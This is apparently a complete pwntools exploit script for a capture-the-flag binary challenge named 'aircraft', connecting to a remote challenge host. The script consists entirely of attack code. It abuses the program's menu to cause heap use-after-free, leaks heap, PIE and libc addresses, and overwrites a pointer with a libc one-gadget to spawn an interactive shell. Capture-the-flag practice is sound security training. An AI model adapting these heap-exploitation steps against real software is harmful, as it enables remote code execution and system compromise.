from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('aircraft.2017.teamrois.cn', 9731)
def buy_plane(index, name):
  s.recvuntil('Your choice:')
  s.send('1\n')
  s.recvuntil('Your choice:')
  s.send(str(index)+'\n')
  s.recvuntil('name:')
  s.send(name)
def select_plane(name):
  s.recvuntil('Your choice:')
  s.send('4\n')
  s.recvuntil('choose?')
  s.send(name)
def flyto(index):
  s.recvuntil('Your choice:')
  s.send('1\n')
  s.recvuntil('fly?')
  s.send(str(index)+'\n')
def shell_plane():
  s.recvuntil('Your choice:')
  s.send('2\n')
def build_port(length,name):
  s.recvuntil('Your choice:')
  s.send('2\n')
  s.recvuntil('name?')
  s.send(str(length)+'\n')
  s.recvuntil('name:')
  s.send(name)
def enter_port(index):
  s.recvuntil('Your choice:')
  s.send('3\n')
  s.recvuntil('choose?')
  s.send(str(index)+'\n')
def list_plane():
  s.recvuntil('Your choice:')
  s.send('1\n')
def shell_port():
  s.recvuntil('Your choice:')
  s.send('2\n')
def exit():
  s.recvuntil('Your choice:')
  s.send('3\n')
buy_plane(3,'AAAA\n')
build_port(0x20,'1234\n')
select_plane('AAAA\n')
flyto(0)
exit()
buy_plane(13,'BBBB\n')
select_plane('BBBB\n')
flyto(0)
exit()
enter_port(0)
list_plane()
heap = u64(s.recvuntil('What')[0x4e:0x4e+6]+'\x00\x00')
log.info('HEAP : 0x%x'%heap)
exit()
buy_plane(3,'CCCC\n')
select_plane('CCCC\n')
shell_plane()
build_port(0x41,'A'*0x41)
buy_plane(3,'CCCC\n')
select_plane('CCCC\n')
flyto(1)
exit()
enter_port(1)
list_plane()
pie = u64(s.recvuntil('What')[0x6f:0x6f+6]+'\x00\x00') - 0xb41
log.info('PIE : 0x%x'%pie)
exit()
buy_plane(3,'DDDD\n')
buy_plane(3,'EEEE\n')
build_port(0x20,'1234\n')
select_plane('DDDD\n')
flyto(2)
exit()
select_plane('EEEE\n')
flyto(2)
exit()
select_plane('DDDD\n')
flyto(2)
exit()
enter_port(2)
shell_port()
buy_plane(3,p64(heap+0x200-0x10)+'\n')
buy_plane(3,p64(0)+'\n')
buy_plane(3,p64(0x42424242)+'\n')
build_port(0x48,'P'*0x4+'\x00'*0x1c+p64(pie+0x0201F70)+'\n')
select_plane('PPPP\n')
flyto(0)
exit()
enter_port(0)
list_plane()
libc = u64(s.recvuntil('What')[0x7f:0x7f+6]+'\x00\x00') - 0x83940
log.info("LIBC : 0x%x"%libc)
exit()
buy_plane(3,'1111\n')
buy_plane(3,'2222\n')
build_port(0x20,'1234\n')
select_plane('1111\n')
flyto(3)
exit()
select_plane('2222\n')
flyto(3)
exit()
select_plane('1111\n')
flyto(3)
exit()
enter_port(3)
shell_port()
buy_plane(3,p64(0x350+heap)+'\n')
buy_plane(3,'OOOO'+'\n')
buy_plane(3,'1234\n')
build_port(0x48,'KKKK\x00'+'A'*(0x30-5)+p64(heap+0x310)*2+p64(libc+0xf0567)+'\n')
select_plane('KKKK\n')
s.interactive()
